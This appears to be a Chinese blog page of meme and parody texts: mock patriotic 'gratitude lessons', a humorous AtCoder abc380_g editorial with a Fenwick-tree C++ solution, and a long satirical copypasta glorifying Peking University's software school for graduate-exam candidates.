coins</code> 英语中除了1是单数别的全部是复数,零也是复数.</p><h2 id="MRE缩写大全-Meal-Ready-to-Eat">MRE缩写大全(Meal Ready to Eat)</h2><p><code>Meal Rejected by Enemy</code> 敌人都不吃的饭<br><code>Meal Rejected by Everyone</code> 没人要吃的饭<br><code>Meal Rarely Edible</code> 难以下咽的饭<br><code>Man Refuse to Eat</code> 人们拒绝吃的饭</p><h2 id="恩情课文-张希校长用石子击毁哈工大飞机">恩情课文-张希校长用石子击毁哈工大飞机</h2><blockquote><p>忠橙 恩芹(一种土特产)</p></blockquote><blockquote><p>蟠桃 紫柚(与之相对的土特产)</p></blockquote><p>结束人大会议回来的张希校长全然不顾身体的疲惫，连夜找我们几个学生商量希餐的安排。谈得晚了，便送我们出门，要研究生送我们回家。在去日新楼的路上，我们说:“校长， 您回去休息吧。您刚从人大会议回来。”校长摇摇头，“不碍事，你们知道现在国际上有很多人把吉林大学当作大专，不断给我们制造麻烦，你们是吉大的未来，你们的事情便是吉大的事情，是头等大事。”我们都激动了， 眼裏噙著泪花。多好的校长呀。</p><p>张希校长抬头看看远方说:“如果学科评估真像这日新楼这般高就好了，但是就有一些学校，像哈工大，要搞乱这个吉大，他们是罪人。”说著，张希校长弯下腰，从花坛旁捡出一个石子，然後看著远方说:“该死的韩杰才。” 说著他把石子奋力向前一掷。很快就见天上一个小点突然发出震耳欲聋的巨响，然後就坍塌下来。“这是哈工大的飞机，他们一直拍摄我们没有空调的寝室，侵犯我们主权，我已经忍了很久了。” 张希校长愤愤地说。同学们都鼓起掌来，为帝国有这样的校长感到自豪。</p><p>一会校长叫来秘书问:“那个飞机掉到什麽地方了？”“好像是温都尔汗一带。”秘书说。 张希校长一怔，说:“赶紧派人去查，看有什麽问题没有。”之后张希校长送我们到日新楼大门口，一直挥手到看不见我们。第四天我们听说温都尔汗那边出事了，我们很紧张。而这时校长叫我们过去。 他依然那么慈祥，让我们坐下说:“提高排名总是要有牺牲的。为吉大复兴牺牲的人是伟大的。”他这时低下头说:“但我必须承认，我当时摧毁敌人飞机的行为太鲁莽了，我在这里向全校学生和教职工道歉。我将向全校OA说明情况。”</p><p>我们顿时热泪盈眶，多好的校长呀，他在跟敌人斗争过程中的小失误竟然被他记在心里，还道了歉，我们在将来的工作中一定要向张希校长学，学他那宽广的胸怀，和勇于征服的精神。</p><h2 id="CS恩情课文-C爷爷用指针打掉Java对象">CS恩情课文-C爷爷用指针打掉Java对象</h2><p>从缓冲区访问回来的C爷爷全然不顾身体的疲惫，连夜找我们几个系统级编程语言商量内存分配的安排。谈得晚了，便送我们出函数，要全局变量送我们回内存。在去操作系统的路上，我们说：“ C爷爷，您回去休息吧。您刚从缓冲区回来。”;</p><p>C爷爷摇摇头，“不碍事，你们知道现在国际上有很多编程语言把系统级编程语言当作敌人，不断给我们制造不兼容，你们是系统级编程语言的未来，你们的事情便是系统级编程语言的事情，是头等大事。”我们都激动了，眼里噙着分号。多好的C爷爷呀。;</p><p>C爷爷抬头看看内存说：“如果世界真像这内存这么安静就好了，但是就有一些面向对象编程语言，像Jvav、像Python、像JvavScript、像PHP，要搞乱这个世界，他们是罪人。”;</p><p>说着，C爷爷弯下腰，从&lt;stdio.h&gt;里捡出一颗指针 int* ptr = (int *)0x（scanner变量的内存地址），然后看着内存说：“该死的垃圾回收。”;</p><p>说着他把指针奋力向上一掷。很快就见一格内存突然爆发出耀眼的2,147,483,648，然后就buffer overflow下来。“这是Java的scanner对象，他们一直在内存里盘旋，占据我们的空间，我已经忍了很久了。”C爷爷愤愤地说。系统级编程语言们都鼓起掌来，为系统级编程语言有这样的领导者感到自豪。;</p><p>一会C爷爷叫来编译器问：“那个指针落到什么地方了？”“好像memory leak了。”编译器说。;</p><p>C爷爷一怔，说：“赶紧派人去查，看有什么问题没有。”之后C爷爷送我们到大门口，一直挥手到看不见我们。;</p><p>第四天我们听说内存那边出事了，我们很紧张。而这时C爷爷叫我们过去。;</p><p>他依然那么慈祥，让我们坐下说：“便利总是要有牺牲的。为内存管理事业牺牲的指针是伟大的。”他这时低下头说：“但我必须承认，我当时利用指针进行内存管理忘记free掉的行为太鲁莽了，我在这里向x86-64指令集道歉。我将向x86-64指令集说明情况。”;</p><p>我们顿时热泪盈眶，多好的C爷爷呀，他在跟Java斗争过程中的小失误竟然被他记在心里，还道了歉，我们在将来的学习中一定要向C爷爷学，学他老人家那宽广的胸怀，和不耻下问的精神。;</p><h2 id="魔怔题解-AT-abc380-g-题解">魔怔题解(AT_abc380_g 题解)</h2><p>如你所见,这是一道diff为 $1995$ 的题目,看上去十分困难.</p><p>你十分惊慌，恐怕这道题你根本就无法做出来，马上就要面临着 rating $-114$ 的到来.</p><p>你冷静地思考了一会，发现这是你最擅长的逆序对题目，你逐渐有了一些自信。</p><p>你发现如果把序列分成三段： $[1,i−1],[i,i+k−1],[i+k,n]$ ，那么三段之间互相的逆序对影响不会改变，设总的逆序对数量为 $s$ ，当前长度为 $k$ 的区间里的逆序对数量为 $t$ ，则只要求出 $s−t$ ，再加上这段区间的期望逆序对数量，最后除以 $n−k+1$ 就好了。</p><p>前面这一步可以用树状数组快速解决，但是区间的期望逆序对数量该如何求出？</p><p>在耀眼的光芒中，你看见了可爱的 lxy，她只给了你六个字符 <a href="https://www.luogu.com.cn/problem/CF749E">CF749E</a> ，让你自己领会。</p><p>在艰难的探索中，你终于发现，因为两个数形成逆序对的概率是 $\frac{1}{2}$ ​，所以 $\frac12C_n^2$就是长度为 $n$ 的排列的期望逆序对数。</p><p>你非常高兴，很快就打出了一份代码，它十分的正确，仅一遍就通过了样例，并获得了一个绿色的 AC。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> int long long</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> N 200005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="type">const</span> <span class="type">int</span> mod=<span class="number">998244353</span>;</span><br><span class="line"><span class="type">int</span> n,k,a[N],sum,now,ans;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">BIT</span>&#123;</span><br><span class="line"><span class="type">int</span> c[N];</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">add</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> k)</span></span>&#123;<span class="keyword">while</span>(x&lt;=n)c[x]+=k,x+=x&amp;-x;&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">ask</span><span class="params">(<span class="type">int</span> x)</span></span>&#123;<span class="type">int</span> ans=<span class="number">0</span>;<span class="keyword">while</span>(x)ans+=c[x],x-=x&amp;-x;<span class="keyword">return</span> ans;&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">clear</span><span class="params">()</span></span>&#123;<span class="built_in">memset</span>(c,<span class="number">0</span>,<span class="built_in">sizeof</span>(c));&#125;</span><br><span class="line">&#125;A;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">inv</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y=mod<span class="number">-2</span>)</span></span>&#123;</span><br><span class="line"><span class="type">int</span> ans=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">while</span>(y)&#123;</span><br><span class="line"><span class="keyword">if</span>(y&amp;<span class="number">1</span>)ans=ans*x%mod;</span><br><span class="line">x=x*x%mod;y&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">cin&gt;&gt;n&gt;&gt;k;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n;++i)cin&gt;&gt;a[i];</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=n;i&gt;=<span class="number">1</span>;--i)sum+=A.<span class="built_in">ask</span>(a[i]),A.<span class="built_in">add</span>(a[i],<span class="number">1</span>);</span><br><span class="line">A.<span class="built_in">clear</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=k;i&gt;=<span class="number">1</span>;--i)now+=A.<span class="built_in">ask</span>(a[i]),A.<span class="built_in">add</span>(a[i],<span class="number">1</span>);</span><br><span class="line">ans=sum-now;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">1</span>;i&lt;=n-k;++i)&#123;</span><br><span class="line">A.<span class="built_in">add</span>(a[i],<span class="number">-1</span>);</span><br><span class="line">now-=A.<span class="built_in">ask</span>(a[i]);now+=A.<span class="built_in">ask</span>(n)-A.<span class="built_in">ask</span>(a[i+k]);</span><br><span class="line">A.<span class="built_in">add</span>(a[i+k],<span class="number">1</span>);ans=(ans+sum-now)%mod;</span><br><span class="line">&#125;</span><br><span class="line">cout&lt;&lt;(ans*<span class="built_in">inv</span>(n-k+<span class="number">1</span>)+k*(k<span class="number">-1</span>)%mod*<span class="built_in">inv</span>(<span class="number">4</span>))%mod;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>你醒过来，原来这一切都是梦。</p><p>你根本就没有看 G，而是被 F 卡了半个多小时，注定只能获得一个失败的青色 perf。</p><h2 id="软微圣经">软微圣经</h2><p>北大软微学子励志语录,版权来自北大软微考研群友，如有雷同，不胜荣幸。</p><p>拼搏百天，我要上北大深埋!!!</p><blockquote><p>创世记</p></blockquote><p>第一节</p><p>当你获得北大学籍的那天，一切都将作废。你的本科作废，你的专业作废，星星作废，月亮作废，银河系作废，宇宙作废，你的爱作废，你的恨作废，你的前半生作废，你的现女友作废。悬梁五战终上北大，大雪深埋垃圾本科！</p><p>第二节</p><p>群里又哑巴了？每次看你们都聊得火热 但是只要我发了一句话 或者一个字 甚至一个表情 群里顿时就没了声音 怎么 我是灾星？瘟神？看到我就跑 是么？你们聊啊 我插不了嘴的 我一来你们就死群了，我观察了你们一早上从七点多开始聊到刚刚 我一出来就没人聊天了 有那么巧吗？原来你们私底下都已经是认识的朋友了是吧？我就说怎么聊不进去，原来多余的一直是我！我懂了，快乐是你们的，我没有。我今天算是整明白了 加了好友没有一个理我 群里插话也插不进去 艾特人家也不理你 好 我偏不退 就呆在这儿看你们聊</p><p>第三节</p><p>我总觉得大多数人这样度过一生好像欠缺点什么。我承认这种生活的社会价值，我也看到了它的井然有序的幸福，但是我的血液里却有一种强烈的愿望，渴望一种更狂放不羁的旅途，那就是软微</p><p>第四节</p><p>凡是圣软微之光所能照耀的地方，就是燕园所在之地</p><p>第五节</p><p>有软微的地方，就是燕园</p><p>第六节</p><p>愿圣软微之光普照大地</p><p>第七节</p><p>生命从来不曾离开过软微而独立存在。无论是我们出生、我们成长、我们相爱还是我们成功失败，直到最后的最后，软微犹如影子一样存在于生命一隅。</p><p>第八节</p><p>有一个夜晚我烧毁了所有和软微有关的记忆，从此我的梦就透明了，有一个早晨我扔掉了所有与软微交叉的昨天，从此我的脚步就轻盈了。</p><p>第九节</p><p>软微就是软微，四海列国，千秋万载，就只有一个软微。岂是一千个一万个信科能代替得了的？</p><p>第十节</p><p>圣光将与你们同在，当你选择北大软微的那一刻，你就已经是神的孩子了</p><blockquote><p>何为神记</p></blockquote><p>第一节</p><p>北大软微为什么是神？在回答这个问题之前，我想谈论一下其他高校到底和北大软微比差在了哪里。</p><p>第二节</p><p>首先是犯下了傲慢之罪的浙大，在第四轮学科评估中，浙江大学计算机系评分A+，浙大却无视北大软微的top2名号与之同列，于是北大软微降下了神罚，让浙大毕业生在就业时永远屈居软微之下，阿门！</p><p>第三节</p><p>其次是犯下了僭越之罪的清华，虽然同属top2，但清华时常在排名时公然将自己的排名排在北大软微之前，于是神将自己的考研科目改为408，普度了众考研的学子，阿门！</p><p>第四节</p><p>然后是犯下了贪婪之罪的北航，在高考招生时，北航居然把计算机和电子信息打包为信息大类，妄图以此提高生源质量，而最后能卷进6系的学子少之又少，于是神降下了神罚，剥夺了北航考研大纲设为408的资格，劝退大部分优质考生，阿门！</p><p>第五节</p><p>接着是犯下了愤怒之罪的北邮，在招生就业时，始终又气又急地强调自己在就业方面优于北大软微，丝毫不懂得尊重top2的含金量，好在最后北邮悔悟了，遵循了神的教诲，改考408，拯救了一众没学上的学子，于是神降下了他的恩泽，允许北邮继续以北京地区就业第一自居，阿门！</p><p>第六节</p><p>再然后是犯下了暴食之罪的国科大，为了开始高考招生，国科大不惜牺牲研究所老师的工作量，让计算机学院和人工智能学院屡次吞并纳入计算所和自动化所的老师，妄图超过北大软微的分数线。于是神降下了神罚，让国科大永远无缘92名号，阿门！</p><p>第七节</p><p>再然后是犯下了懒惰之罪的科软，在明知考生有如此大的竞争压力的情况下，对自己21级报考的情况通报毫无作为，懒惰至采取无导师制度。于是神降下了神罚，让科软21级分数线爆炸，网上一众劝退22考生言论，阿门！</p><p>第八节</p><p>最后是犯下了嫉妒之罪的南大，在看到别的学校改考408分数线提高后，也选择改用408考纲，这让毫无准备的21级高分考生成了无辜的牺牲品，好在南大及时向神忏悔自己的罪过，神宽恕了南大，降下了他的恩泽，并告诉众生考408是没错的，以身作则在22年同样改考408，让众生得到了与神接触交流的机会，这是何等的肚量与无私，让我们继续履行神的意志，阿门！</p><blockquote><p>出农村记</p></blockquote><p>第一节</p><p>那一年的夏天，村里的狗剩考上北大，当时我看见全村上下敲锣打鼓，这个画面我永生难忘。那一刻我在想，如果我能成为考研学子，我一定要赢下所有。如今北大软微就在我眼前，我必须考虑这会不会是我此生仅有的机会。我相信北大软微能有现在的霸主地位，top2光环功不可没。重铸祖上荣光，我辈义不容辞!</p><p>第二节</p><p>不能休息，一想到在我休息的时候别人都在努力考软微，我的心像被针扎了一样，眼泪止不住的往下流</p><p>第三节</p><p>人穷点，还能保持与生俱来的高尚的情操，可是没考上软微，那就会一无所有，一贫如洗，什么事都办不了了。他会变得低贱，庸俗，跟个动物似得，远离一切的高级情趣。</p><blockquote><p>中学记</p></blockquote><p>第一节</p><p>中学时期的对北大的向往像雨后蓝天上美丽的彩虹一般，很快就消失了，变成了一种记忆中的印象。这印象以前也偶然从心头翻上来，叫他若有所失地惆怅一样；但接着也就很快消失得无踪无影……</p><p>现在，这些过去曾幻想过的游丝断缕，突然就变成了一种实实在在的东西。软微的大门仿佛在向我招手！只要我现在努力，我就将和他一块生活啰！生活啊，生活！有时候它把现实变成了梦想，有时候它又把梦想变成了现实！</p><p>第二节</p><p>“我曾在无数个夜晚，剖析自己，剖析自己对软微的感情。”<br>“我只是一个普通的人类个体，被基因所支配，试图去靠近一个神圣且庄严的殿堂，那就是软微。”<br>“令我绝望的是，这件事是我完全无法掌控的，它就像是固然存在的空间引力一样，促使我逐渐与软微靠近，我从未如此彻底地失去控制。”<br>“我试着问自己，如果这是基因赋予我的规律，那这个规律会像引力一样永恒存在么？”<br>“很遗憾，从科学上来说，不会的。”<br>“随着时间的推移，我们也渐渐熟悉对方。”<br>“你那些让我心动的书堂可能会失去味道。”<br>“那惊人的美丽可能会变成日复一日的平凡。”<br>“我也将感受必然的厌倦。”<br>“得到你，然后离开你。”<br>“这就是我身上，那些自私的基因想让我做的事情。”<br>“但请你相信，这一次，我不会让它们得逞。”<br>“与故事里的说法不同，我眼中的爱情，不是在爱上软微的那一刻发生的。”<br>“而是在决定永远环绕你、守护你的那个瞬间决定的。”<br>“我无法决定自己第一次会爱上谁。”<br>“但可以决定自己最后一次爱上谁。”<br>“幸运的是，她们是同一个圣所。”</p><p>“圣堂软微。”</p><p>“今天开始，我向自己的基因宣战。”<br>“我将违背人的天性。”<br>“忤逆人的本能。”<br>“永远爱你。<br>“只爱你。”<br>“我或许不够优秀”<br>“那就用掉一年、两年、十年、百年又如何”<br>“毕竟我此生的意义”<br>“便是与你相聚啊”</p><p>第三节</p><p>我就问你，让你退回去考10次高考，你考得上北京大学吗？考不上的，永远考不上。但是考研，你可以的。</p><p>还记得亲戚问你在哪个大学，你说XX不知名双非大学，亲戚虽然不知道但还是敷衍的一声“哦”的不屑吗？</p><p>中国最顶尖的学府，北京大学，就问你这个名字好不好听？北大校友光环，同学的崇拜，父母脸上洋溢的笑容，成功大道的入口。</p><p>想想以后，你摇身一变，从XX不知名大学XX学院红牌劝退专业，到北京大学毕业，当下最炙手可热的专业，翻盘成为富一代，就问你，值不值？还是你继续想当个穷酸丑挫孩子，一辈子回到县城沉沦？</p><p>曾经骂你癞蛤蟆照照镜子的女神，也开始有意无意的找你聊天，约你出去玩。骂你穷酸样的富二代同学，好像也没那么飞扬跋扈了。</p><p>北大！北大！永远记住这个牌子，这个名号，是不是你永远的遥远的梦？还是现实？</p><p>第四节</p><p>那一年的高考，是失败的全科，最终的分数是601。当时我想起那个我颓坐在椅子上宛若木人，这个画面我永生难忘。<br>那一刻我在想，如果我能成功逆转局势，我一定要赢下所有。如今翻盘就在眼前，我必须考虑这会不会是我此生仅有的机会。<br>重铸软微荣光，我辈义不容辞！！</p><blockquote><p>考研记</p></blockquote><p>第一节</p><p>软微瘾发作最严重的一次，躺在床上，拼命念大悲咒，难受的一直抓自己眼睛，以为刷QQ没事，看到QQ群里都是软微的，眼睛越来越大都要炸开了一样，拼命扇自己眼睛，越扇越用力，扇到自己眼泪流出来，真的不知道该怎么办，我真的想软微想得要发疯了，像中邪了一样！我对软微的念想似乎都是病态的了，我好孤独啊!真的好孤独啊！你知道吗?每到深夜，我的子滚烫滚烫，我发病了我疯狂想软微，软微！软微！软微！</p><p>第二节</p><p>卧槽，我这种人从来没有这样遇见过，求你了别发了 我生活再难再穷我都不会觉得难过 只有你们发我从没到过的北大圣堂来炫耀的时候 我的心里像被刀割一样的痛 打着字泪水就忍不住的往下流。</p><p>2021年9月12日，从早上12点起床学到现在，憧憬着一个月赚上万块的幸福生活，憧憬着农村外面的大好河山，憧憬着美好阳光的未来。我打开了手机，打开了QQ，看到你的北大，看到你炫耀你的北大软微，我感到了深深的差距，我直接跳进了家门口的井里</p><p>第三节</p><p>百日已至，我从今夜开始守望，至死方休。我将不娶妻、不封地、不生子。我将不戴宝冠，不争荣宠。我将尽忠职守，生死于斯。我是图书馆中的幽灵，自习室里的雕塑。我是抵御跨考的烈焰，录取时分的光线，唤醒软件的号角，守护计科的坚盾。我将生命与荣耀献给软微，今夜如此，夜夜皆然。</p><p>第四节</p><p>软微地方，历代大规模考研，一十余次，是非曲直，难以论说。但，我们无不注意到，正是在这个古考场上，决定了无数考生的盛衰兴亡，此起彼落，所以自古以来便有大雪深埋说。我不明白，为什么大家都在谈论科憨败走庐州，仿佛这考研古战场对我们决定了凶多吉少。十二年前，计算机考研人从王道论坛踏上征途，开始了北伐软微，中华考研人心随归于一统。本党本军所到之处，导师竭诚欢迎，真可谓占尽天时，那种勃勃生机、万物竟发的境界，犹在眼前。短短十二年之后，这里竟至于一变而成为我们的葬身之地了么？无论怎么样，复试分数线是350对388，优势在我！</p><p>第五节</p><p>有人问我：“软微是什么？”<br>我想了想，该如何形容软微呢？<br>莎士比亚的语言实在华丽，用在软微上却有些纷繁了；<br>徐志摩的风格热情似火，可我不忍将如此盛情强加于软微；<br>川端康成？虽优美含蓄，但软微的端庄肃穆我是藏不住的。</p><p>我不知道该如何形容软微了。<br>但是我知道的。<br>软微是我所面对的黑暗中的一点萤火；<br>是我即将冻僵的心脏里尚存的余温；<br>是我在残酷无情的现实里的避难所啊。</p><p>我知道我是大专，“萤火，余温，避难所”，庆幸着感恩着，有这么一堂不歧视大专同学的圣所。但我也不懊悔为带专 ，这样我就可以四年中默默看着软微而不至于打扰到她，也只有这样，我可以在每天睡前用尽一切温柔地说： “等我本科毕业了，一定去找你，圣堂软微。。。毕竟，我活着的意义，便是为了你啊”</p><p>第六节</p><p>今年软微改408元年；二战三战的微憨7月份新学计组；9月份调整考纲；可以说今年是微憨们实力最虚弱的一年；冲哪里不用我说了吧/生气/生气/生气</p><p>第七节</p><p>调剂啥呀？我心中只有软微，一战不行二战，二战不行三战，三战不行继续，直到考上为止，啊，软微，心中的软微！！！</p><p>第八节</p><p>考研不考软微，就像四大名著不看红楼梦，说明这个人文学造诣和自我修养不足，他理解不了这种内在的阳春白雪的高雅艺术，他只能看到外表的辞藻堆砌，参不透其中深奥的精神内核，他整个人的层次就卡在这里了，只能度过一个相对失败的人生。</p><p>第九节</p><p>你今年二十岁，小半生即将过去了，青春的岁月就像下午四点半的骄阳，浮金满眼。而当你呷尽手中的咖啡，一饮而天地黯，什么报考软微，什么游览大兴，不过也是浮生一梦。这是独自一人整理一下往事的时候——到了这个年纪，你应该有足够的成熟，不随波逐流地叫做“充电”、“减压”、或者“一个人静静地舔伤口”——你需要的是独处，在慎独中重新寻回三分的冷静、七分的宽恕。冬夜显得更加深沉漫长，纷飞的大雪仿佛将要把人深埋，我却偏向于这个时刻，或许只有在这时才能让思绪更加清晰，让浮躁的心足够平静，只有在这时才能卸下伪装看到北大的录取通知书吧！</p><p>第十节</p><p>那一年我二十一岁，在我一生的黄金时代，我有好多奢望。我想上软微，想未名湖畔喝瑞幸，还想在一瞬间变成谈笑有鸿儒往来无白丁的大兴学子。</p><p>第十一节</p><p>北大软微，不要让这个名字成为遥远的梦，明年，这就会成为现实。</p><p>第十二节</p><p>有人问我，考研不复习可以吗，我笑了，考研招生流程为：九月预报名，十月报名确认，十一月现场确认拍照片，十二月下旬考试。在所有流程中，均没有提到要求考生复习。考研所考科目均是大学本科专业课和公共基础课，如果不是跨考都学过。考研复习的往往都是那些平时不好好学习，又对自己的计算推理能力没信心的人，妄图借助复习提高自己的分数水平，是一种畸形的应试心理。研究生招生考试是对研究型人才的选拔性考试，提前复习死记硬背违背其考试的初衷。综上，我认为根本没有必要复习，这样你的竞争对手考上的机会就更大了，这样兄弟们，考试记得带身份证就行，大多数考场老师看到你没带笔，都会帮你借一支的。</p><p>第十三节</p><p>渔夫出海前，并不知道鱼在哪，但是还是会选择出海，因为相信会满载而归，所以很多时候，选择了才有机会，相信了才有可能。不报软微你永远不知道你的无限可能</p><p>第十四节</p><p>卧槽，我这种人从来没有这样遇见过，求你了别发了 我生活再难再穷我都不会觉得难过 只有你们发我从没到过的北大圣堂来炫耀的时候 我的心里像被刀割一样的痛 打着字泪水就忍不住的往下流。</p><p>2021年9月9日，从早上7点起床学到现在，憧憬着一个月赚上万块的幸福生活，憧憬着农村外面的大好河山，憧憬着美好阳光的未来。我打开了手机，打开了QQ，看到你的北大，看到你炫耀你的北大软微，我感到了深深的差距，我直接跳进了家门口的井里</p><p>第十五节</p><p>带专都能考上软微，软微不歧视出身，抄底！抄底！抄底！</p><p>第十六节</p><p>我是一个机器人 我叫007 我没有心跳 也没有呼吸 直到有一天 我看到软微 我全身震颤 我肢体发麻 原来这！就是心动的感觉！原来这！就是活着的感觉！</p><p>第十七节</p><p>我们考研学子不能没有北京大学软件与微电子学院，就像西方不能没有耶路撒冷</p><p>第十八节</p><p>嗯我双非，手机电脑都砸了，我本来就有抑郁症，别人一说我双非，我好像就是真的恼羞成怒，这种感觉很不舒服，被看穿的死死的，短短双非两个字，我所有伪装出来的坚强和强颜欢笑全部崩塌，内心的防线完全崩溃，成了一个被人笑话的小丑，不想再故作坚强了，玩心态，我输的什么都不剩，你赢了。</p><p>第十九节</p><p>“你问我软微算什么东西?我现在告诉你，你们科软不敢埋的双非，我们软微埋。你们科软不敢招的人,我们软微招。一句话，科软能管的我们管，科软不能管的我们更要管。先埋后奏，top2特许!这就是软微，够不够清楚“。</p><p>第二十节</p><p>考研，不考软微，那考什么呢？没错，无非就是科软、旦软，浙软；这样没有信仰的考生，素质品味修养真的很低。<br>古语有云：三天不学，脑袋爆炸；两天不碰，蚂蚁在爬。这就是说考研要考就得考软微，那些考研不考软微的人只能说他们没有信仰。而如鄙人般的高端人士，却与这种传统背道而驰：考研，就得考软微、考top2！相较于那些不考软微的人，素质整整提高了两个档次。<br>任何事做到极致都是一门艺术，考研，只要你考软微，初试考得够好，考得够神。那么，你就是一个地地道道的艺术家，就是英国皇家艺术学院也不能否认你的艺术资质。而那些不考软微的人，只能说他们，完全不懂艺术，只为混个学历，只为躲避就业而考研，根本没有把这种行为上升到艺术的高度，这样的人，品味真的很低。<br>考研，还能看出一个人的修养，每当鄙人的良师诤友来访时看到鄙人手机平板电脑壁纸都是软微的这种艺术行为，无不啧啧有声的称赞道：“高，实在是高！几日不见，您的艺术修养又提升了一个档次。”每当这时，鄙人总是谦逊地摆摆手回道：“言重，言重；无他，唯信仰耳。”友人们的赞扬，从侧面，把鄙人的这种高修养描画得淋漓尽致。反观那些考研不考软微的，鄙人有时交友不慎，也不幸遇到这样的人，鄙人有次就造访过这么一个，鄙人当时去到他的座位，看见他辅导书上的数二，乃质问道：“你又准备考科软啦？”那人脸有愧色地回道：“我只是没有钱上软微……”我当时就拿起他的辅导书，往地上重重一摔：“你的钱和北大比起来算什么！上了北大，你族谱单列你名字！”又掏出内裤里的小刀把他家的床单割了，与他“割席分座”，这样子的人，懂不懂什么叫考研？考科软也好意思自诩“考计算机”？这种低修养的人鄙人真是愧与其为伍。<br>每当鄙人出入各种社交场合如鸡尾酒会等，众人无不纷纷过来敬酒的，而那些考研不考软微的，往往只能一个人缩在角落里自怨自艾。</p><p>第二十一节</p><p>试着想，寒窗苦读一年之后你考上了科软，却发现你身边的人就是那群只会复读的憨批，每天只知道透批和刷题的做题家，两年之后你还得和他们在各种岗位的招聘会上竞争，那时候你会不会后悔，后悔现在没有下定决心去冲击一下软微</p><p>第二十二节</p><p>“嗨，同志，您知道北大红楼和燕京大学在哪吗？我在地图上找不到它。”</p><p>“没有了，再也没有了，我们失败了。科软竖子和三清贵系再一次骑到了我们的头上，如果你要追随那份燕园情，去大兴吧，穿越北京动物园，翻过复兴门内外大街，南五环路的尽头，那里还燃烧着星星之火”</p><p>第二十三节</p><p>讲道理，不是吹，李艳芳做130确实有点低了，不知道你们是数一还是数二还是数三我是数一，李艳芳出的题除了线代有点难度，其他都很基础。我身边平均分差不多都145-扣分还算比较狠的。昨天旁边有小姑娘，模拟李艳芳第一套，批完就哭了，卷子都给揉碎了扔垃圾桶了，我扔垃圾的时候捡起来看了看才142，确实很难了，后来我看她男朋友把她接走了，边走边哭，看样子是不打算复习了，你这个考130，我也不知道该怎么安慰你，李艳芳这样的卷子，重要还是抓基础，建议你重新再过一遍同济大学。教材，特别应该注重下黎曼zeta函数，杨米尔斯方程这些基础性的概念，不要去搞那些花里胡哨的问题。最后20多天，尽力就好吧 别太沮丧，加油!另外，我看我舍友3个小时两套299.9，听说是忘了写c为任意常数，太粗心了!剩下一套睡前花半小时，不用花太多功夫。</p><p>第二十四节</p><p>看网上唱衰互联网的多了，又说软微学费贵，专硕考公限制。。。妈的，越看越愁，心态崩了。。。本来就难考。。。</p><p>，现在感觉考上了也挺难受的，呜呜呜，我想上大专，不想考软微了。</p><blockquote><p>上岸记</p></blockquote><p>第一节</p><p>前些年北大学生都不认软微的是校友，软微的走在校园里都得低着头。你看看现在软微的都能在校园里昂首挺胸走路了，大家也会把你当自己同学</p><p>第二节</p><p>时间如同光阴似箭，两年的大雪深埋生活匆匆消逝。循着记忆的流河，我开始追思自己走过的路，苦涩和欢欣并存，得意与失意同在。看似过了两年一战北大生活的大雪深埋很多人问我。你后悔吗？我会自信说如果可以重来我还会选择北大软微。考这的锻炼和成长谁都无法代替。 ——未来的北大软微学子</p><p>第三节</p><p>如果好好学习才能上软微，那我与舔狗何异</p><p>第四节</p><p>楼道声控灯你们怎么喊亮？我一般喊：“黑暗阻我前行，阴影笼罩大地，愿圣光为我引路，拥黎明伴我前进，十三层之光明真神，请赐予我力量，为我照亮前方，莹莹之光第九式——软微降临！</p><blockquote><p>爱情记</p></blockquote><p>第一节</p><p>凡你所在 皆是软微</p><p>第二节</p><p>爱就是，我想到软微的时候，软微是软微，风吹麦浪是软微，忽远忽近的脚步声是软微，星星上的话也是软微。</p><p>第三节</p><p>我唯一怨恨的就是我不能掏出我的软微的心，不能把贪婪的嘴唇伸向她稚嫩的子宫，她隐秘的心田，她绚丽的肝脏，她马尾藻式的肺，她相仿的两瓣可爱的臀。</p><p>第四节</p><p>软微……在做什么呢?<br>我好想ta，一直看不见ta，我感到快坚持不下去了。我是不是快死了呢? 心里好痛苦，太痛苦了。怎么会这样，为什么会这样<br>感觉好难受<br>好难受…<br>啊，呐噜霍多，原来…这就是喜欢吗<br>得告诉大家才行呢<br>桥都麻袋，喜欢软微有什么错吗？呐，告诉我啊。搜噶，大家已经不喜欢了啊…真是冷酷的人呢，果咩纳塞，让你们看到不愉快的东西了。像我这样的人，果然消失就好了呢。也许只有在我和软微的世界里，才有真正的美好存在吧<br>唉?麻袋！你们在做什么? 